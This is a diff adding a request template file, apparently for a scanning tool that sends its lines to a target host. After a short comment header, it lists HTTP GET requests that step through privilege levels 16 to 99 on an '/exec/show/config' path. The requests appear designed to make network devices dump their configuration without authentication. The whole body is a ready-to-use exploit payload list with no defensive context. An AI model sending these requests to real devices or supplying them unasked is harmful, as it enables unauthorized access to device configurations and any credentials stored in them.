@@ -1,0 +1,98 @@
+#
+# The commands entered below will be sent to the target host.
+#
+# Example:
+#
+# HEAD / HTTP/1.0\r\n
+#
+# Other Notes:
+#
+# - %IP% will be replaced with the current IP address.
+# - \r\n will be replaced with an actual carriage return.
+#
+#############################################################
+
+GET /level/16/exec/show/config/CR HTTP/1.1\r\n
+GET /level/17/exec/show/config/CR HTTP/1.1\r\n
+GET /level/18/exec/show/config/CR HTTP/1.1\r\n
+GET /level/19/exec/show/config/CR HTTP/1.1\r\n
+GET /level/20/exec/show/config/CR HTTP/1.1\r\n
+GET /level/21/exec/show/config/CR HTTP/1.1\r\n
+GET /level/22/exec/show/config/CR HTTP/1.1\r\n
+GET /level/23/exec/show/config/CR HTTP/1.1\r\n
+GET /level/24/exec/show/config/CR HTTP/1.1\r\n
+GET /level/25/exec/show/config/CR HTTP/1.1\r\n
+GET /level/26/exec/show/config/CR HTTP/1.1\r\n
+GET /level/27/exec/show/config/CR HTTP/1.1\r\n
+GET /level/28/exec/show/config/CR HTTP/1.1\r\n
+GET /level/29/exec/show/config/CR HTTP/1.1\r\n
+GET /level/30/exec/show/config/CR HTTP/1.1\r\n
+GET /level/31/exec/show/config/CR HTTP/1.1\r\n
+GET /level/32/exec/show/config/CR HTTP/1.1\r\n
+GET /level/33/exec/show/config/CR HTTP/1.1\r\n
+GET /level/34/exec/show/config/CR HTTP/1.1\r\n
+GET /level/35/exec/show/config/CR HTTP/1.1\r\n
+GET /level/36/exec/show/config/CR HTTP/1.1\r\n
+GET /level/37/exec/show/config/CR HTTP/1.1\r\n
+GET /level/38/exec/show/config/CR HTTP/1.1\r\n
+GET /level/39/exec/show/config/CR HTTP/1.1\r\n
+GET /level/40/exec/show/config/CR HTTP/1.1\r\n
+GET /level/41/exec/show/config/CR HTTP/1.1\r\n
+GET /level/42/exec/show/config/CR HTTP/1.1\r\n
+GET /level/43/exec/show/config/CR HTTP/1.1\r\n
+GET /level/44/exec/show/config/CR HTTP/1.1\r\n
+GET /level/45/exec/show/config/CR HTTP/1.1\r\n
+GET /level/46/exec/show/config/CR HTTP/1.1\r\n
+GET /level/47/exec/show/config/CR HTTP/1.1\r\n
+GET /level/48/exec/show/config/CR HTTP/1.1\r\n
+GET /level/49/exec/show/config/CR HTTP/1.1\r\n
+GET /level/50/exec/show/config/CR HTTP/1.1\r\n
+GET /level/51/exec/show/config/CR HTTP/1.1\r\n
+GET /level/52/exec/show/config/CR HTTP/1.1\r\n
+GET /level/53/exec/show/config/CR HTTP/1.1\r\n
+GET /level/54/exec/show/config/CR HTTP/1.1\r\n
+GET /level/55/exec/show/config/CR HTTP/1.1\r\n
+GET /level/56/exec/show/config/CR HTTP/1.1\r\n
+GET /level/57/exec/show/config/CR HTTP/1.1\r\n
+GET /level/58/exec/show/config/CR HTTP/1.1\r\n
+GET /level/59/exec/show/config/CR HTTP/1.1\r\n
+GET /level/60/exec/show/config/CR HTTP/1.1\r\n
+GET /level/61/exec/show/config/CR HTTP/1.1\r\n
+GET /level/62/exec/show/config/CR HTTP/1.1\r\n
+GET /level/63/exec/show/config/CR HTTP/1.1\r\n
+GET /level/64/exec/show/config/CR HTTP/1.1\r\n
+GET /level/65/exec/show/config/CR HTTP/1.1\r\n
+GET /level/66/exec/show/config/CR HTTP/1.1\r\n
+GET /level/67/exec/show/config/CR HTTP/1.1\r\n
+GET /level/68/exec/show/config/CR HTTP/1.1\r\n
+GET /level/69/exec/show/config/CR HTTP/1.1\r\n
+GET /level/70/exec/show/config/CR HTTP/1.1\r\n
+GET /level/71/exec/show/config/CR HTTP/1.1\r\n
+GET /level/72/exec/show/config/CR HTTP/1.1\r\n
+GET /level/73/exec/show/config/CR HTTP/1.1\r\n
+GET /level/74/exec/show/config/CR HTTP/1.1\r\n
+GET /level/75/exec/show/config/CR HTTP/1.1\r\n
+GET /level/76/exec/show/config/CR HTTP/1.1\r\n
+GET /level/77/exec/show/config/CR HTTP/1.1\r\n
+GET /level/78/exec/show/config/CR HTTP/1.1\r\n
+GET /level/79/exec/show/config/CR HTTP/1.1\r\n
+GET /level/80/exec/show/config/CR HTTP/1.1\r\n
+GET /level/81/exec/show/config/CR HTTP/1.1\r\n
+GET /level/82/exec/show/config/CR HTTP/1.1\r\n
+GET /level/83/exec/show/config/CR HTTP/1.1\r\n
+GET /level/84/exec/show/config/CR HTTP/1.1\r\n
+GET /level/85/exec/show/config/CR HTTP/1.1\r\n
+GET /level/86/exec/show/config/CR HTTP/1.1\r\n
+GET /level/87/exec/show/config/CR HTTP/1.1\r\n
+GET /level/88/exec/show/config/CR HTTP/1.1\r\n
+GET /level/89/exec/show/config/CR HTTP/1.1\r\n
+GET /level/90/exec/show/config/CR HTTP/1.1\r\n
+GET /level/91/exec/show/config/CR HTTP/1.1\r\n
+GET /level/92/exec/show/config/CR HTTP/1.1\r\n
+GET /level/93/exec/show/config/CR HTTP/1.1\r\n
+GET /level/94/exec/show/config/CR HTTP/1.1\r\n
+GET /level/95/exec/show/config/CR HTTP/1.1\r\n
+GET /level/96/exec/show/config/CR HTTP/1.1\r\n
+GET /level/97/exec/show/config/CR HTTP/1.1\r\n
+GET /level/98/exec/show/config/CR HTTP/1.1\r\n
+GET /level/99/exec/show/config/CR HTTP/1.1\r\n
